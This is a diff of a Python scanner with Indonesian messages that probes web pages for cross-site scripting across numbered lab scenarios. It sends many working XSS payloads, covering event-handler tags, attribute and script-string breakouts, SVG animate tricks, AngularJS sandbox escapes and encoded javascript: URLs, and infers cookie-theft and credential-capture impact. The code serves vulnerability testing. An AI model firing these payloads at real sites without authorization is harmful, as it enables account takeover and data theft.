-        allowed = bool(ok and re.search(r"<\s*" + re.escape(tag) + r"\b", body, re.I))
-        self._tag_cache[key] = allowed
-        return allowed
-
-    def _try_handler_payload(self, builder: Callable[[str], str], pattern: str,
-                             claim: str) -> tuple[bool, str, dict[str, Any]]:
-        marker = _random_token()
-        payload = builder(marker)
-        ok, body, meta = self._probe(payload)
-        if not ok:
-            return False, "", {}
-        if re.search(pattern.format(m=re.escape(marker)), body, re.I):
-            if self._claim(claim):
-                return True, body, {"marker": marker, **meta}
-        return False, body, {}
-
-    def _lab_14(self) -> tuple[bool, str, dict[str, Any]]:
-        if self._tag_allowed("script"):
-            return self._no("Tag <script> tidak diblokir; tidak ada filter tag untuk dilewati (lihat vektor 01).")
-        attempts = [
-            ("img", lambda m: "<img src=x onerror=alert('" + m + "')>", r"onerror\s*=\s*alert\(\s*['\"]?{m}"),
-            ("body", lambda m: "<body onload=alert('" + m + "')>", r"onload\s*=\s*alert\(\s*['\"]?{m}"),
-            ("svg", lambda m: "<svg onload=alert('" + m + "')>", r"onload\s*=\s*alert\(\s*['\"]?{m}"),
-            ("iframe", lambda m: '<iframe src="javascript:alert(\'' + m + "')\">", r"javascript:\s*alert\(\s*['\"]?{m}"),
-        ]
-        for tag, builder, pattern in attempts:
-            ok, _body, meta = self._try_handler_payload(builder, pattern, "tag_bypass:" + tag)
-            if ok:
-                return True, "Tag <script> diblokir, tetapi <" + tag + "> dengan event handler lolos filter dan ter-refleksi mentah.", {
-                    "bypass_tag": tag, **meta}
-        return self._no("Tidak ada bypass tag/atribut yang terkonfirmasi (atau filter tag tidak ada).")
-
-    def _lab_15(self) -> tuple[bool, str, dict[str, Any]]:
-        for tag in ("script", "img", "body", "svg", "iframe"):
-            if self._tag_allowed(tag):
-                return self._no("Tag <" + tag + "> masih diterima; bukan skenario 'semua tag diblokir kecuali custom'.")
-        ok, _body, meta = self._try_handler_payload(
-            lambda m: "<xss id=x tabindex=1 onfocus=alert('" + m + "') autofocus>",
-            r"onfocus\s*=\s*alert\(\s*['\"]?{m}", "custom_tag")
-        if ok:
-            return True, "Semua tag standar diblokir, tetapi custom element <xss> dengan handler diterima.", {
-                "bypass_tag": "xss", **meta}
-        return self._no("Tidak ada custom element ber-handler yang lolos filter.")
-
-    def _lab_16(self) -> tuple[bool, str, dict[str, Any]]:
-        if self._tag_allowed("script"):
-            return self._no("Tag <script> tidak diblokir; bukan skenario 'sebagian markup SVG diizinkan'.")
-        if not self._tag_allowed("svg"):
-            return self._no("Markup <svg> juga diblokir, sehingga tidak ada SVG yang dapat dipakai.")
-        attempts = [
-            (lambda m: "<svg><animatetransform onbegin=alert('" + m + "')>",
-             r"onbegin\s*=\s*alert\(\s*['\"]?{m}", "svg_event"),
-            (lambda m: "<svg><animate attributeName=href values=javascript:alert('" + m + "') /><text x=20 y=20>x</text></svg>",
-             r"values\s*=\s*javascript:\s*alert\(\s*['\"]?{m}", "svg_animate"),
-        ]
-        for builder, pattern, claim in attempts:
-            ok, _body, meta = self._try_handler_payload(builder, pattern, "svg:" + claim)
-            if ok:
-                return True, "Markup SVG dengan event/animasi berbahaya ter-refleksi mentah meski <script> diblokir.", {
-                    "bypass": claim, **meta}
-        return self._no("Tidak ada markup SVG berbahaya yang lolos filter.")
-
-    def _lab_17(self) -> tuple[bool, str, dict[str, Any]]:
-        marker = _random_token()
-        payload = "' accesskey='x' onclick='alert(" + marker + ")' x='"
-        ok, body, meta = self._probe(payload)
-        if not ok:
-            return self._no("Payload tidak ter-refleksi di tag canonical.")
-        for ctx in _analyze_reflection(body, payload, marker):
-            if not ctx["exact"] or not ctx["in_tag"]:
-                continue
-            lt = body.rfind("<", 0, ctx["pos"])
-            gt = body.find(">", ctx["pos"])
-            tag_html = body[lt:gt + 1] if lt != -1 and gt != -1 else ""
-            if not re.search(r"rel\s*=\s*['\"]?canonical", tag_html, re.I):
-                continue
-            if not re.search(r"onclick\s*=", tag_html, re.I):
-                continue
-            if self._claim("canonical:" + str(meta.get("key"))):
-                return True, "Tag <link rel=canonical> dapat di-breakout dan menerima handler onclick.", {
-                    "context": "canonical_link", **meta}
-        return self._no("Tidak ada breakout pada tag canonical link.")
-
-    def _lab_18(self) -> tuple[bool, str, dict[str, Any]]:
-        marker = _random_token()
-        payload = "</script><script>alert('" + marker + "')</script>"
-        ok, body, meta = self._probe(payload)
-        if not ok:
-            return self._no("Payload </script> tidak ter-refleksi.")
-        if self._fp_is("<", "raw") is False:
-            return self._no("Angle bracket di-encode; </script> tidak dapat keluar dari blok script.")
-        if self._fp_is("'", "raw") or self._fp_is("\\", "raw"):
-            return self._no("Kutip tunggal/backslash tidak di-escape; bukan skenario 'single quote dan backslash escaped'.")
-        for ctx in _analyze_reflection(body, payload, marker):
-            if not ctx["exact"] or not ctx["in_script"]:
-                continue
-            if self._claim("js_script_break:" + str(meta.get("key"))):
-                return True, "Kutip tunggal & backslash di-escape, tetapi </script> lolos mentah sehingga blok script dapat ditutup.", {
-                    "context": "js_script_breakout", **meta}
-        return self._no("Tidak ada breakout </script> pada string JavaScript.")
-
-    def _lab_19(self) -> tuple[bool, str, dict[str, Any]]:
-        marker = _random_token()
-        payload = "\\';alert('" + marker + "');//"
-        ok, body, meta = self._probe(payload)
-        if not ok:
-            return self._no("Payload escape backslash tidak ter-refleksi.")
-        if not (self._fp_is("<", "encoded") and self._fp_is('"', "encoded")):
-            return self._no("Angle bracket/kutip ganda tidak di-encode; bukan skenario gabungan lab ini.")
-        if not self._fp_is("'", "encoded"):
-            return self._no("Kutip tunggal tidak di-escape, sehingga trik escape backslash tidak relevan.")
-        if not self._fp_is("\\", "raw"):
-            return self._no("Backslash ikut di-escape; trik escape backslash tidak dapat dipakai.")
-        for ctx in _analyze_reflection(body, payload, marker):
-            if not ctx["exact"] or not ctx["in_script"] or ctx["js"] != "sq":
-                continue
-            if self._claim("js_bs_escape:" + str(meta.get("key"))):
-                return True, "Backslash tidak di-escape sementara kutip tunggal di-escape: payload dapat keluar dari string JS.", {
-                    "context": "js_backslash_escape", **meta}
-        return self._no("Tidak ada breakout string JS lewat escape backslash.")
-
-    def _lab_20(self) -> tuple[bool, str, dict[str, Any]]:
-        marker = _random_token()
-        payload = "&apos;-alert(" + marker + ")-&apos;"
-
-        def checker(body: str, _payload: str, mk: str) -> bool:
-            for tag in re.findall(r"<[^>]+>", body, re.S):
-                if mk in tag and re.search(r"\bon[a-z]+\s*=", tag, re.I):
-                    return True
-            return False
-
-        result = self._stored_probe(payload, checker)
-        if result[0]:
-            return result[0], result[1] + " Nilai tersimpan masuk ke atribut event (onclick/on*) tanpa netralisasi.", result[2]
-        return result
-
-    def _lab_21(self) -> tuple[bool, str, dict[str, Any]]:
-        marker = _random_token()
-        payload = "${alert(" + marker + ")}"
-        ok, body, meta = self._probe(payload)
-        if not ok:
-            return self._no("Payload template literal tidak ter-refleksi.")
-        for ctx in _analyze_reflection(body, payload, marker):
-            if not ctx["exact"] or not ctx["in_script"] or ctx["js"] != "tpl":
-                continue
-            if self._claim("template:" + str(meta.get("key"))):
-                return True, "Payload ${...} ter-refleksi di dalam template literal (backtick) tanpa escape.", {
-                    "context": "template_literal", **meta}
-        return self._no("Refleksi tidak berada di dalam template literal yang dapat di-escape.")
-
-    def _executable_confirmed(self) -> list[int]:
-        return sorted(
-            lab_id for lab_id in _EXECUTABLE_LAB_IDS
-            if self._results.get(lab_id, {}).get("confirmed")
-        )
-
-    def _lab_22(self) -> tuple[bool, str, dict[str, Any]]:
-        deps = self._executable_confirmed()
-        if not deps:
-            return self._no("Belum ada vektor XSS executable yang terkonfirmasi; dampak pencurian cookie tidak dapat diklaim.")
-        if not self._set_cookies:
-            return self._no("Tidak ada cookie sesi yang teramati (Set-Cookie), klaim pencurian cookie tidak dapat dibuktikan.")
-        if all("httponly" in cookie.lower() for cookie in self._set_cookies):
-            return self._no("Semua cookie teramati memakai HttpOnly; document.cookie tidak dapat dibaca.")
-        return True, ("Vektor XSS executable terkonfirmasi (" + ", ".join(str(d) for d in deps)
-                      + ") dan ada cookie tanpa HttpOnly -> cookie dapat dicuri."), {
-            "depends_on": deps, "impact": "cookie_theft"}
-
-    def _lab_23(self) -> tuple[bool, str, dict[str, Any]]:
-        deps = self._executable_confirmed()
-        if not deps:
-            return self._no("Belum ada vektor XSS executable yang terkonfirmasi; dampak penangkapan password tidak dapat diklaim.")
-        has_password = any(re.search(r"type\s*=\s*['\"]?password", page.text or "", re.I) for page in self.pages)
-        if not has_password:
-            return self._no("Tidak ada form password pada halaman yang dipindai; klaim penangkapan password tidak dapat dibuktikan.")
-        return True, ("Vektor XSS executable (" + ", ".join(str(d) for d in deps)
-                      + ") + form password tersedia -> kredensial dapat ditangkap."), {
-            "depends_on": deps, "impact": "password_capture"}
-
-    def _lab_24(self) -> tuple[bool, str, dict[str, Any]]:
-        deps = self._executable_confirmed()
-        if not deps:
-            return self._no("Belum ada vektor XSS executable yang terkonfirmasi; dampak bypass CSRF tidak dapat diklaim.")
-        token_field = False
+    def _angular_present(self):
+        if self._angular_scopes(): return True
         for page in self.pages:
-            for form in page.forms:
-                for name, _value, _input_type in form.fields:
-                    if re.search(r"csrf|authenticity|_token|token", name, re.I):
-                        token_field = True
-        if not token_field:
-            return self._no("Tidak ada field token CSRF yang teramati; klaim bypass CSRF tidak dapat dibuktikan.")
-        return True, ("Vektor XSS executable (" + ", ".join(str(d) for d in deps)
-                      + ") + form ber-token CSRF -> permintaan ber-CSRF dapat dipalsukan."), {
-            "depends_on": deps, "impact": "csrf_bypass"}
+            if re.search(r"angular(?:\.min)?\.js|ng-app|ng-bind|ng-controller|ng-repeat", page.text or "", re.I): return True
+        return False
 
-    def _angular_sandbox(self, require_csp: bool) -> tuple[bool, str, dict[str, Any]]:
-        if not self._angular_present():
-            return self._no("Tidak ada ng-app; sandbox AngularJS tidak dapat diuji.")
-        if require_csp and not self._csp_header:
-            return self._no("Tidak ada header CSP; skenario 'sandbox escape + CSP' tidak berlaku.")
-        marker = _random_token()
-        payload = ("{{toString().constructor.prototype.charAt=[].join;[1]|orderBy:"
-                   "toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)}}" + marker)
-        ok, body, meta = self._probe(payload)
-        if not ok:
-            return self._no("Payload sandbox escape tidak ter-refleksi.")
+    def _tag_allowed(self, point, tag):
+        ck = (point.key, tag.lower())
+        if ck in self._tag_cache: return self._tag_cache[ck]
+        marker = _random_token(); payload = f"<{tag} data-sx={marker}>z</{tag}>"
+        body, _ = self._send(point, payload)
+        allowed = bool(body and re.search(r"<\s*"+re.escape(tag)+r"\b[^>]*"+re.escape(marker), body, re.I))
+        self._tag_cache[ck] = allowed; return allowed
+
+    def _handler_in_tag(self, body, marker, handler):
+        for m in re.finditer(re.escape(marker), body):
+            s = body.rfind("<", 0, m.start()); e = body.find(">", m.start())
+            region = body[s:e+1] if s!=-1 and e!=-1 else body[max(0,m.start()-150):m.start()+100]
+            if re.search(r"\b"+re.escape(handler)+r"\s*=", region, re.I) and re.search(r"alert\s*\(", region, re.I):
+                return True, region
+        return False, ""
+
+
+    # ==================== LAB 01-15 ====================
+    def _lab_01(self):
+        # Reflected XSS into HTML context with nothing encoded
+        for build in [lambda m: f"<script>alert('{m}')</script>",
+                      lambda m: f"<img src=x onerror=alert('{m}')>",
+                      lambda m: f"<svg onload=alert('{m}')>"]:
+            for point in self._ranked_points()[:12]:
+                if not self._lab_budget(): break
+                marker = _random_token(); payload = build(marker)
+                body, meta = self._reflects(point, marker, payload)
+                if not body: continue
+                for ctx in _analyze_reflection(body, payload, marker):
+                    if not ctx.get("exact") or ctx.get("in_comment") or ctx.get("in_tag") or ctx.get("in_script"):
+                        continue
+                    if ctx.get("parent_tag") in _NON_EXEC_TEXT: continue
+                    ok_tag = False
+                    if "<script" in payload.lower():
+                        ok_tag = bool(re.search(r"<script[^>]*>[^<]*alert\s*\(\s*['\"]?"+re.escape(marker), body, re.I))
+                    elif "onerror=" in payload:
+                        ok_tag = self._handler_in_tag(body, marker, "onerror")[0]
+                    elif "onload=" in payload:
+                        ok_tag = self._handler_in_tag(body, marker, "onload")[0]
+                    if ok_tag and self._claim(1, point.key, "html"):
+                        return self._yes(f"XSS reflected terkonfirmasi (HTML context, tanpa encoding) di {meta.get('url')} ({meta.get('point')}).", {**meta, "context":"html_text"})
+        return self._no("Tidak ditemukan reflected XSS pada konteks HTML tanpa encoding.")
+
+    def _lab_02(self):
+        # Stored XSS into HTML context with nothing encoded
+        def chk(body, payload, marker):
+            if re.search(r"<script[^>]*>[^<]*"+re.escape(marker), body, re.I): return True
+            if self._handler_in_tag(body, marker, "onerror")[0] or self._handler_in_tag(body, marker, "onload")[0]: return True
+            for ctx in _analyze_reflection(body, payload, marker):
+                if ctx.get("exact") and not ctx.get("in_tag") and not ctx.get("in_script") and not ctx.get("in_comment"):
+                    if ctx.get("parent_tag") not in _NON_EXEC_TEXT and ("<img" in payload or "<svg" in payload): return True
+            return False
+        for pb in [lambda m: f"<img src=x onerror=alert('{m}')>", lambda m: f"<svg onload=alert('{m}')>"]:
+            ok, ev, det = self._stored_check(pb, chk)
+            if ok and self._claim(2, str(det.get("point")), "stored_html"): return self._yes(ev, det)
+        return self._no("Tidak ada bukti stored XSS pada konteks HTML.")
+
+    def _lab_03(self):
+        # DOM XSS: document.write, location.search source
+        hits = self._dom_evidence(
+            [r"location\.search", r"location\.href", r"document\.URL", r"document\.documentURI", r"new\s+URLSearchParams", r"\.searchParams"],
+            [r"document\.write\s*\(", r"document\.writeln\s*\("], proximity=800)
+        for url, snip in hits:
+            if re.search(r"<select\b", snip, re.I): continue
+            if self._claim(3, url, "dw"): return self._yes(f"DOM XSS (source URL -> document.write) terindikasi di {url}.", {"url":url,"sink":"document.write","source":"location","snippet":snip})
+        return self._no("Tidak ditemukan alur source URL -> document.write.")
+
+    def _lab_04(self):
+        # DOM XSS: innerHTML, location.search source
+        hits = self._dom_evidence(
+            [r"location\.search", r"location\.href", r"document\.URL", r"URLSearchParams", r"\.searchParams"],
+            [r"\.innerHTML\s*[+=]", r"\.outerHTML\s*[+=]", r"insertAdjacentHTML\s*\("], proximity=800)
+        for url, snip in hits:
+            if self._claim(4, url, "ih"): return self._yes(f"DOM XSS (source URL -> innerHTML/outerHTML) terindikasi di {url}.", {"url":url,"sink":"innerHTML","source":"location","snippet":snip})
+        return self._no("Tidak ditemukan alur source URL -> innerHTML.")
+
+    def _lab_05(self):
+        # DOM XSS: jQuery href, location.search source
+        hits = self._dom_evidence(
+            [r"location\.search", r"location\.href", r"URLSearchParams"],
+            [r"\.attr\s*\(\s*['\"]href['\"]", r"\.prop\s*\(\s*['\"]href['\"]"], proximity=800)
+        for url, snip in hits:
+            if self._claim(5, url, "href"): return self._yes(f"DOM XSS (source URL -> jQuery href) terindikasi di {url}.", {"url":url,"sink":"$.attr(href)","source":"location.search","snippet":snip})
+        # fallback: direct href assignment with URL source
+        hits2 = self._dom_evidence([r"location\.search", r"URLSearchParams"], [r"\.href\s*="], proximity=500)
+        for url, snip in hits2:
+            if re.search(r"\$\(|jQuery|attr", snip, re.I) and self._claim(5, url, "href2"):
+                return self._yes(f"DOM XSS (source URL -> href) terindikasi di {url}.", {"url":url,"sink":"href","snippet":snip})
+        return self._no("Tidak ditemukan alur source URL -> href (jQuery/DOM).")
+
+    def _lab_06(self):
+        # DOM XSS: jQuery selector sink using hashchange
+        for url, js in self._dom_blocks():
+            if not re.search(r"hashchange|onhashchange", js, re.I): continue
+            if not re.search(r"\$\(|jQuery", js): continue
+            # $(location.hash) or $(hash) pattern near hashchange/location.hash
+            if re.search(r"\$\s*\(\s*(?:location\.hash|[^)]*\bhash\b[^)]*)\s*\)", js, re.I) or \
+               re.search(r"location\.hash[\s\S]{0,300}\$\s*\(", js, re.I):
+                snip = ""
+                for m in re.finditer(r"\$\s*\([^)]*(?:hash|location)[^)]*\)", js, re.I): snip = m.group(0)[:180]; break
+                if not snip:
+                    for m in re.finditer(r"hashchange[\s\S]{0,200}", js, re.I): snip = m.group(0)[:180].replace("\n"," "); break
+                if self._claim(6, url, "jqhash"): return self._yes(f"DOM XSS (location.hash/hashchange -> jQuery selector) terindikasi di {url}.", {"url":url,"sink":"$(...)","source":"location.hash","snippet":snip})
+        return self._no("Tidak ditemukan alur location.hash/hashchange -> jQuery selector.")
+
+    def _lab_07(self):
+        # Reflected XSS into attribute with angle brackets HTML-encoded
+        for build, handler in [(lambda m: f'" autofocus onfocus=alert(\'{m}\') x="', "onfocus"),
+                                (lambda m: f'" onmouseover=alert(\'{m}\') x="', "onmouseover"),
+                                (lambda m: f"' autofocus onfocus=alert('{m}') x='", "onfocus")]:
+            for point in self._ranked_points()[:12]:
+                if not self._lab_budget(): break
+                marker = _random_token(); payload = build(marker)
+                body, meta = self._reflects(point, marker, payload)
+                if not body: continue
+                # Verify actual breakout: handler attribute injected into a tag
+                if not self._handler_in_tag(body, marker, handler)[0]: continue
+                # Check if < > were encoded in the reflection context (scenario characteristic) - informational
+                enc = self._encoding_at_point(point)
+                if self._claim(7, point.key, "attr"):
+                    note = " (angle brackets ter-encode, kutip breakout)" if enc.get("<") in ("encoded","removed") else ""
+                    return self._yes(f"Breakout atribut terkonfirmasi{note} di {meta.get('url')} ({meta.get('point')}); handler {handler} terinjeksi.", {**meta,"context":"attribute","handler":handler,"encoding":enc})
+        return self._no("Tidak ditemukan breakout atribut XSS yang terkonfirmasi.")
+
+    def _lab_08(self):
+        # Stored XSS into anchor href with double quotes HTML-encoded
+        def chk(body, payload, marker):
+            for tag in re.findall(r"<a\b[^>]*>", body, re.I|re.S):
+                if marker in tag and re.search(r"\bhref\s*=\s*['\"]?\s*javascript\s*:", tag, re.I): return True
+            return False
+        for pb in [lambda m: f"javascript:alert('{m}')", lambda m: f"javascript:alert(1)//{m}"]:
+            ok, ev, det = self._stored_check(pb, chk)
+            if ok and self._claim(8, str(det.get("point")), "href"): return self._yes(ev+" href anchor menerima javascript:.", det)
+        return self._no("Tidak ada bukti stored XSS pada href anchor (javascript:).")
+
+    def _lab_09(self):
+        # Reflected XSS into JS string with angle brackets HTML encoded
+        for build, pat in [(lambda m: f"'-alert('{m}')-'", r"'-alert\s*\("),
+                           (lambda m: f"';alert('{m}');//", r"';alert\s*\("),
+                           (lambda m: f"\"-alert('{m}')-\"", r'"-alert\s*\(')]:
+            for point in self._ranked_points()[:12]:
+                if not self._lab_budget(): break
+                marker = _random_token(); payload = build(marker)
+                body, meta = self._reflects(point, marker, payload)
+                if not body: continue
+                for ctx in _analyze_reflection(body, payload, marker):
+                    if not ctx.get("exact") or not ctx.get("in_script"): continue
+                    pos = ctx.get("pos",0)
+                    seg_s = body.rfind("<script", 0, pos); seg_e = body.find(">", seg_s) if seg_s!=-1 else -1
+                    seg = body[seg_e+1: pos+len(marker)+30] if seg_e!=-1 else ""
+                    if re.search(pat, seg) and self._claim(9, point.key, "js"):
+                        enc = self._encoding_at_point(point)
+                        return self._yes(f"Breakout string JavaScript terkonfirmasi di {meta.get('url')} ({meta.get('point')}).", {**meta,"context":"js_string","encoding":enc})
+        return self._no("Tidak ditemukan breakout string JavaScript yang terkonfirmasi.")
+
+    def _lab_10(self):
+        # DOM XSS: document.write into <select>, location.search source
+        for url, js in self._dom_blocks():
+            if not re.search(r"document\.write\s*\(", js, re.I): continue
+            if not re.search(r"<select|<option|select\b", js, re.I): continue
+            if not re.search(r"location\.search|location\.href|URLSearchParams|document\.URL", js, re.I): continue
+            snip = ""
+            for m in re.finditer(r"document\.write[\s\S]{0,220}", js, re.I):
+                if re.search(r"select|option|location", m.group(0), re.I): snip = m.group(0)[:200].replace("\n"," "); break
+            if self._claim(10, url, "dwsel"): return self._yes(f"DOM XSS (location.search -> document.write dalam <select>) terindikasi di {url}.", {"url":url,"sink":"document.write(select)","snippet":snip})
+        return self._no("Tidak ditemukan document.write ke <select> dengan source URL.")
+
+    def _lab_11(self):
+        # DOM XSS: AngularJS expression (angle brackets/dquotes encoded context)
+        if not self._angular_present(): return self._no("AngularJS tidak terdeteksi.")
         scopes = self._angular_scopes()
-        for ctx in _analyze_reflection(body, payload, marker):
-            if not ctx["exact"] or ctx["in_script"]:
-                continue
-            if not any(start <= ctx["pos"] <= end for _url, start, end in scopes):
-                continue
-            return True, "Ekspresi sandbox-escape AngularJS ter-refleksi mentah di dalam scope ng-app.", {
-                "context": "angular_sandbox", "csp": self._csp_header[:200], **meta}
-        return self._no("Ekspresi sandbox escape tidak ter-refleksi di dalam scope ng-app.")
+        for build in [lambda m: "{{constructor.constructor('alert(1)')()}}"+m,
+                      lambda m: "{{$on.constructor('alert(1)')()}}"+m,
+                      lambda m: "{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}"+m]:
+            for point in self._ranked_points()[:10]:
+                if not self._lab_budget(): break
+                marker = _random_token(); payload = build(marker)
+                body, meta = self._reflects(point, marker, payload)
+                if not body: continue
+                for ctx in _analyze_reflection(body, payload, marker):
+                    if not ctx.get("exact") or ctx.get("in_script"): continue
+                    pos = ctx.get("pos",0)
+                    in_scope = (not scopes) or any(s <= pos <= e for _,s,e in scopes)
+                    if in_scope and self._claim(11, point.key, "ng"):
+                        return self._yes(f"Ekspresi AngularJS ter-refleksi mentah di scope Angular pada {meta.get('url')} ({meta.get('point')}).", {**meta,"context":"angular_expression"})
+        return self._no("Ekspresi AngularJS tidak terkonfirmasi di scope yang dievaluasi.")
 
-    def _lab_25(self) -> tuple[bool, str, dict[str, Any]]:
-        return self._angular_sandbox(require_csp=False)
+    def _lab_12(self):
+        # Reflected DOM XSS
+        sinks = any(re.search(r"\.innerHTML|document\.write|eval\s*\(|insertAdjacentHTML|\.outerHTML", js, re.I) for _,js in self._dom_blocks())
+        for build in [lambda m: f"\"-alert('{m}')-\"", lambda m: f"'-alert('{m}')-'", lambda m: f"\\\"-alert('{m}')//"]:
+            for point in self._ranked_points()[:10]:
+                if not self._lab_budget(): break
+                marker = _random_token(); payload = build(marker)
+                body, meta = self._reflects(point, marker, payload)
+                if not body: continue
+                for ctx in _analyze_reflection(body, payload, marker):
+                    if not ctx.get("exact"): continue
+                    if ctx.get("in_script") and self._claim(12, point.key, "rdom"):
+                        return self._yes(f"Input ter-refleksi ke dalam <script> di {meta.get('url')} (pola reflected DOM XSS); sink DOM terdeteksi={sinks}.", {**meta,"context":"reflected_dom","sinks":sinks})
+        return self._no("Tidak ditemukan pola reflected DOM XSS yang terkonfirmasi.")
 
-    def _lab_26(self) -> tuple[bool, str, dict[str, Any]]:
-        result = self._angular_sandbox(require_csp=True)
-        if result[0]:
-            return result[0], result[1] + " CSP terdeteksi: " + self._csp_header[:120], result[2]
-        return result
+    def _lab_13(self):
+        # Stored DOM XSS
+        def chk(body, payload, marker):
+            for ctx in _analyze_reflection(body, payload, marker):
+                if ctx.get("exact") and (ctx.get("in_script") or not ctx.get("in_tag")):
+                    if re.search(r"\.innerHTML|document\.write|insertAdjacentHTML|\$\(|eval\s*\(", body, re.I): return True
+            return False
+        for pb in [lambda m: f"'-alert('{m}')-'", lambda m: f"<img src=x onerror=alert('{m}')>"]:
+            ok, ev, det = self._stored_check(pb, chk)
+            if ok and self._claim(13, str(det.get("point")), "sdom"): return self._yes(ev, det)
+        return self._no("Tidak ada bukti stored DOM XSS yang terkonfirmasi.")
 
-    def _probe_stripped(self, payload: str, pattern: str) -> bool | None:
-        ok, body, _meta = self._probe(payload)
-        if not ok:
-            return None
-        return not re.search(pattern, body, re.I)
+    def _lab_14(self):
+        # Reflected XSS, most tags and attributes blocked
+        for point in self._ranked_points()[:10]:
+            if not self._lab_budget(): break
+            script_ok = self._tag_allowed(point, "script")
+            if script_ok: continue  # not this scenario; but still try to find bypass evidence? no, scenario mismatch
+            # try bypass tags/handlers
+            attempts = [
+                ("img","onerror", lambda m: f"<img src=x onerror=alert('{m}')>"),
+                ("svg","onload", lambda m: f"<svg onload=alert('{m}')>"),
+                ("body","onload", lambda m: f"<body onload=alert('{m}')>"),
+                ("input","onfocus", lambda m: f"<input autofocus onfocus=alert('{m}')>"),
+                ("details","ontoggle", lambda m: f"<details open ontoggle=alert('{m}')>"),
+            ]
+            for tag, handler, build in attempts:
+                if not self._lab_budget(): break
+                marker = _random_token(); payload = build(marker)
+                body, meta = self._reflects(point, marker, payload)
+                if not body: continue
+                if self._handler_in_tag(body, marker, handler)[0] and re.search(r"<\s*"+tag+r"\b", body, re.I):
+                    if self._claim(14, point.key, f"bypass_{tag}"):
+                        return self._yes(f"<script> diblokir tapi <{tag} {handler}> lolos dan ter-refleksi di {meta.get('url')} ({meta.get('point')}).", {**meta,"bypass_tag":tag,"handler":handler})
+        # If we couldn't do tag_allowed checks due to budget, try direct bypass
+        if not any(self._tag_cache.values()):
+            for tag, handler, build in [("img","onerror", lambda m: f"<img src=x onerror=alert('{m}')>"), ("svg","onload", lambda m: f"<svg onload=alert('{m}')>")]:
+                for point in self._ranked_points()[:8]:
+                    if not self._lab_budget(): break
+                    marker = _random_token(); payload = build(marker)
+                    body, meta = self._reflects(point, marker, payload)
+                    if body and self._handler_in_tag(body, marker, handler)[0] and self._claim(14, point.key, f"d_{tag}"):
+                        return self._yes(f"Payload <{tag} {handler}> ter-refleksi executable di {meta.get('url')} (indikasi bypass filter tag).", {**meta,"bypass_tag":tag})
+        return self._no("Tidak ada bypass filter tag yang terkonfirmasi.")
 
-    def _lab_27(self) -> tuple[bool, str, dict[str, Any]]:
-        control_marker = _random_token()
-        event_blocked = self._probe_stripped(
-            "<img src=x onerror=alert('" + control_marker + "')>", r"onerror\s*=\s*alert")
-        href_blocked = self._probe_stripped(
-            '<a href="javascript:alert(\'' + control_marker + "')\">x</a>", r"javascript:")
-        if event_blocked is None or href_blocked is None:
-            return self._no("Payload kontrol tidak ter-refleksi; status blokir tidak dapat diverifikasi.")
-        if not (event_blocked and href_blocked):
-            return self._no("Event handler dan/atau href tidak terbukti diblokir; vektor bypass tidak dapat diklaim.")
-        marker = _random_token()
-        payload = ("<svg><animate attributeName=href values=javascript:alert('"
-                   + marker + "') /><a><text x=20 y=20>c</text></a></svg>")
-        ok, body, meta = self._probe(payload)
-        if not ok:
-            return self._no("Payload bypass tidak ter-refleksi.")
-        if re.search(r"values\s*=\s*javascript:\s*alert\(\s*['\"]?" + re.escape(marker), body, re.I):
-            return True, "Event handler & href diblokir, tetapi <animate attributeName=href values=javascript:...> lolos.", {
-                "context": "svg_animate_href", **meta}
-        return self._no("Payload bypass SVG tidak lolos filter.")
+    def _lab_15(self):
+        # All tags blocked except custom ones
+        for point in self._ranked_points()[:8]:
+            if not self._lab_budget(): break
+            # check common tags blocked
+            blocked = all(not self._tag_allowed(point, t) for t in ("script","img","svg","body","iframe"))
+            if not blocked: continue
+            for handler, build in [("onfocus", lambda m: f"<xss id=x tabindex=1 onfocus=alert('{m}')>"),
+                                   ("onclick", lambda m: f"<satria onclick=alert('{m}')>x</satria>")]:
+                if not self._lab_budget(): break
+                marker = _random_token(); payload = build(marker)
+                body, meta = self._reflects(point, marker, payload)
+                if body and self._handler_in_tag(body, marker, handler)[0] and self._claim(15, point.key, "custom"):
+                    return self._yes(f"Tag standar diblokir tapi custom element dengan {handler} lolos di {meta.get('url')} ({meta.get('point')}).", {**meta,"handler":handler})
+        return self._no("Tidak ada custom element bypass yang terkonfirmasi.")
 
-    def _lab_28(self) -> tuple[bool, str, dict[str, Any]]:
-        control_marker = _random_token()
-        blocked = self._probe_stripped(
-            '<a href="javascript:alert(\'' + control_marker + "')\">x</a>", r"javascript:")
-        if blocked is None:
-            return self._no("Payload kontrol tidak ter-refleksi; status blokir tidak dapat diverifikasi.")
-        if not blocked:
-            return self._no("Skema javascript: tidak diblokir; bukan skenario 'beberapa karakter diblokir'.")
-        marker = _random_token()
-        payload = '<a href="&#106;avascript:alert(\'' + marker + "')\">x</a>"
-        ok, body, meta = self._probe(payload)
-        if not ok:
-            return self._no("Payload bypass JavaScript URL tidak ter-refleksi.")
-        if re.search(r"href\s*=\s*['\"]?&#106;?avascript:\s*alert\(", body, re.I):
-            return True, "Skema javascript: diblokir, tetapi varian ter-encode (&#106;avascript:) lolos di atribut href.", {
-                "context": "js_url_encoded", **meta}
-        return self._no("Tidak ada varian JavaScript URL ter-encode yang lolos.")
+    # ==================== LAB 16-24 ====================
+    def _lab_16(self):
+        for point in self._ranked_points()[:8]:
+            if not self._lab_budget(): break
+            if self._tag_allowed(point, "script"): continue
+            if not self._tag_allowed(point, "svg"): continue
+            for handler, build in [("onbegin", lambda m: f"<svg><animateTransform onbegin=alert('{m}') attributeName=transform>"),
+                                   ("onbegin", lambda m: f"<svg><animate onbegin=alert('{m}') attributeName=x dur=1s>"),
+                                   ("onload", lambda m: f"<svg onload=alert('{m}')>")]:
+                if not self._lab_budget(): break
+                marker = _random_token(); payload = build(marker)
+                body, meta = self._reflects(point, marker, payload)
+                if body and self._handler_in_tag(body, marker, handler)[0] and re.search(r"<svg", body, re.I):
+                    if self._claim(16, point.key, "svg"):
+                        return self._yes(f"<script> diblokir tapi markup SVG dengan {handler} lolos di {meta.get('url')} ({meta.get('point')}).", {**meta,"handler":handler})
+        return self._no("Tidak ada markup SVG berbahaya yang terkonfirmasi.")
 
-    def _lab_29(self) -> tuple[bool, str, dict[str, Any]]:
+    def _lab_17(self):
+        for build in [lambda m: f"' accesskey='x' onclick='alert({m})' x='",
+                      lambda m: f"' onclick='alert(1)//{m}' accesskey='x"]:
+            for point in self._ranked_points()[:10]:
+                if not self._lab_budget(): break
+                marker = _random_token(); payload = build(marker)
+                body, meta = self._reflects(point, marker, payload)
+                if not body: continue
+                for tag in re.findall(r"<link\b[^>]*>", body, re.I|re.S):
